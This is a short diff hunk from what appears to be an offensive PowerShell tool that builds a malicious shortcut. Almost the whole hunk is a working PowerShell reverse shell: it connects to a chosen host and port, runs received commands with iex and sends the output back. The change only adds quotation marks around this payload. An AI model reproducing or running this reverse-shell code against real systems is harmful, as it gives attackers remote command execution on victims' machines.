@@ -42,7 +42,7 @@ Param (
 )
 
 $Command = @"
-$Application;`$Client = New-Object System.Net.Sockets.TCPClient('$ComputerName', $Port);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();
+"$Application;`$Client = New-Object System.Net.Sockets.TCPClient('$ComputerName', $Port);`$Stream = `$Client.GetStream();[byte[]]`$Bytes = 0..255|%{0};while((`$i = `$Stream.Read(`$Bytes, 0, `$Bytes.Length)) -ne 0){;`$Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$Bytes,0, `$i);`$SendBack = (iex `$Data 2>&1 | Out-String );`$SendBack2  = `$SendBack + 'PS ' + (pwd).Path + '> ';`$SendByte = ([Text.Encoding]::ASCII).GetBytes(`$SendBack2);`$Stream.Write(`$SendByte,0,`$SendByte.Length);`$Stream.Flush()};`$Client.Close();"
 "@
 
 Write-Host "[*] Creating shortcut (${ComputerName}:$Port)"
